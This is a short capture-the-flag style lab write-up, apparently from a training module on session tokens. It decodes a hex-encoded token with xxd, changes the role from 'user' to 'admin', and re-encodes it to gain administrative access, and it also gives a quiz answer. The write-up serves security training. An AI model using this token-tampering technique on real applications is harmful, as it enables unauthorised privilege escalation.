# [Attacking Session Tokens](Attacking%20Session%20Tokens.md)
### A session token can be brute-forced if it lacks sufficient what?

entropy
### Obtain administrative access on the target to obtain the flag.

![](Screenshot%202026-09-14%20at%2010.40.22.png)

```sh
echo "757365723d6874622d7374646e743b726f6c653d75736572" | xxd -r -p

user=htb-stdnt;role=user
```

Let's modify htb-stdnt's role

```sh
echo "user=htb-stdnt;role=admin" | xxd -p

757365723d6874622d7374646e743b726f6c653d61646d696e0a
```

Then change this value and we can obtain a flag

![](Screenshot%202026-09-14%20at%2010.42.29.png)